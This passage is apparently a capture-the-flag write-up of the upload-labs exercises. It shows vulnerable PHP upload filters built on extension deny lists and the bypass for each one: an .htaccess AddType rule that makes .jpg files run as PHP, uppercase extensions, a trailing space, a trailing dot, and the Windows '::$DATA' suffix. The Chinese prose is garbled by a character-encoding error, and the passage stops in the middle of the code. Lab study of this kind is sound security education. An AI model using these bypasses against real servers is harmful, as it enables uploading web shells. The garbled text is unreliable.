<p>æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œä½¿å¾—Apacheå¯ä»¥å°†jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶ï¼Œä½†è¦æ³¨æ„å¹¶ä¸æ˜¯ä»»ä½•æ—¶å€™éƒ½å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæœ‰æ•ˆçš„.htaccessæ–‡ä»¶ï¼Œåœ¨è®©.htaccessç”Ÿæ•ˆä¹‹å‰è¿˜éœ€è¦å¯¹httpd.confæ–‡ä»¶è¿›è¡Œé…ç½®ï¼š</p>
<ol>
<li>
<p>ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ä¿®æ”¹httpd.confï¼Œå¢åŠ å¦‚ä¸‹è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LoadModule rewrite_module modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>.htaccessæ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<p>å†ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè¿™æ ·Apacheå°±å¯ä»¥å°†jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127185226.png" alt=""></p>
<h3 id="Pass-05-åˆ©ç”¨åç¼€åå¤§å°å†™ç»•è¿‡">Pass-05 åˆ©ç”¨åç¼€åå¤§å°å†™ç»•è¿‡</h3>
<h4 id="ä»£ç -v5">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v5">ç»•è¿‡æ–¹å¼</h4>
<h5 id="è§£æé¡ºåº-v3">è§£æé¡ºåº</h5>
<p>åˆ†æä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™å¥<code>$file_ext = strrchr($file_name, '.');</code>ä¸­çš„<code>strrchr()</code>å‡½æ•°æ˜¯æœ‰ç‚¹é—®é¢˜çš„ã€‚è¿™ä¸ªå‡½æ•°çš„æ„æ€æ˜¯â€œå‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦â€ã€‚æ‰€ä»¥å’ŒPass-03ç›¸ä¼¼ï¼šå½“ç¢°åˆ°ä¸è®¤è¯†çš„æ‰©å±•åæ—¶ï¼Œå°†ä¼šä»åå‘å‰è§£æï¼Œç›´åˆ°ç¢°åˆ°è®¤è¯†çš„ æ‰©å±•åï¼Œå¦‚æœéƒ½ä¸è®¤è¯†ï¼Œåˆ™ä¼šæš´éœ²å…¶æºç ã€‚</p>
<h5 id="å¤§å°å†™ç»•è¿‡">å¤§å°å†™ç»•è¿‡</h5>
<p>å¯ä»¥ç›´æ¥å°†æ–‡ä»¶æ”¹ä¸º.PHPåç¼€ï¼ŒApacheç…§æ ·æˆåŠŸè§£æã€‚</p>
<h3 id="Pass-06-åˆ©ç”¨ç©ºæ ¼ç»•è¿‡">Pass-06 åˆ©ç”¨ç©ºæ ¼ç»•è¿‡</h3>
<h4 id="ä»£ç -v6">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v6">ç»•è¿‡æ–¹å¼</h4>
<p>ç›¸æ¯”å‰å‡ é¢˜ï¼Œå¤§å°å†™ç»•è¿‡å’Œä¸Šä¼ .htaccessæ–‡ä»¶å·²ç»è¡Œä¸é€šäº†ï¼Œä½†æ˜¯æ²¡æœ‰å»é™¤æ–‡ä»¶åé¦–å°¾çš„ç©ºæ ¼ã€‚æ‰€ä»¥æ­¤å¤„å¯ä»¥åˆ©ç”¨windowsç³»ç»Ÿçš„å‘½åè§„åˆ™è¿›è¡Œç»•è¿‡ã€‚</p>
<blockquote>
<p>Winä¸‹xx.jpg[ç©ºæ ¼] æˆ–xx.jpg.è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹ã€‚</p>
</blockquote>
<p>åœ¨æ­¤å¤„ä»£ç è¿‡æ»¤äº†<code>.</code>å’Œ<code>::$DATA</code>ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª.php[ç©ºæ ¼]æ–‡ä»¶å³å¯ã€‚</p>
<h5 id="ç©ºæ ¼ç»•è¿‡">ç©ºæ ¼ç»•è¿‡</h5>
<p>ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º<code>1.php .</code>è¿™ç§å½¢å¼ï¼Œä»ä»£ç æ‰§è¡Œæµç¨‹åˆ†ææ¥çœ‹ï¼Œä¼šå…ˆå»é™¤æ–‡ä»¶åæœ«å°¾çš„.,å»é™¤ä¹‹åçš„æ–‡ä»¶åç¼€æ˜¯ .php[ç©ºæ ¼]ï¼Œåˆ©ç”¨.php[ç©ºæ ¼]ç»•è¿‡é»‘åå•ï¼Œç„¶ååˆ©ç”¨windowsçš„æ–‡ä»¶å‘½åè§„åˆ™é»˜è®¤é™¤å»ç©ºæ ¼å’Œè¾¾åˆ°ä¸Šä¼ .phpçš„ç›®çš„ã€‚</p>
<h3 id="Pass-07-åˆ©ç”¨-ç»•è¿‡">Pass-07 åˆ©ç”¨.ç»•è¿‡</h3>
<h4 id="ä»£ç -v7">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v7">ç»•è¿‡æ–¹å¼</h4>
<h5 id="ç‚¹ç»•è¿‡">ç‚¹ç»•è¿‡</h5>
<p>ä»ä»£ç ä¸Šçœ‹ï¼Œå¯ä»¥å‘ç°ç›¸æ¯”äºPass-06ä»£ç ï¼ŒåŠ ä¸Šäº†é¦–å°¾å»ç©ºï¼Œä½†æ˜¯å´å°‘äº†å°¾éƒ¨å»ç‚¹ã€‚æ•…å’Œä¸Šé¢Pass-06ä¸€æ ·ï¼Œåˆ©ç”¨windowsæ–‡ä»¶å‘½åè§„åˆ™ç»•è¿‡ã€‚</p>
<p>ç”¨burpå°†ä¸Šä¼ æ–‡ä»¶åç¼€æ”¹ä¸º.php.å³å¯ï¼Œè¯¦ç»†åŸç†ä¸Pass-06ç±»ä¼¼ã€‚</p>
<h3 id="Pass-08-åˆ©ç”¨-DATA-ç»•è¿‡ï¼ˆWindowsç¯å¢ƒï¼‰">Pass-08 åˆ©ç”¨$DATA::ç»•è¿‡ï¼ˆWindowsç¯å¢ƒï¼‰</h3>
<h4 id="ä»£ç -v8">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v8">ç»•è¿‡æ–¹å¼</h4>
<h5 id="DATAç»•è¿‡">::$DATAç»•è¿‡</h5>
<p>ç›¸æ¯”ä¸Šé¢ä¸¤é“é¢˜ï¼Œå°‘äº†å»é™¤æ–‡ä»¶åçš„&quot;::$DATA&quot;å­—ç¬¦ä¸²è¿™ä¸€æ­¥ï¼Œè¿™é‡Œè¿˜æ˜¯åˆ©ç”¨windowsçš„ä¸€ä¸ªç‰¹æ€§ã€‚</p>
<blockquote>
<p>åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒ&quot;::$DATA&quot;ä¹‹å‰çš„æ–‡ä»¶åã€‚</p>
</blockquote>
<p>ç”¨Burpå°†ä¸Šä¼ æ–‡ä»¶åç¼€æ”¹ä¸º:<code>xx.php::$DATA</code>å³å¯ã€‚</p>
<h3 id="Pass-09-åˆ©ç”¨-ç©ºæ ¼-ç»•è¿‡">Pass-09 åˆ©ç”¨.+ç©ºæ ¼+.ç»•è¿‡</h3>
<h4 id="ä»£ç -v9">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span 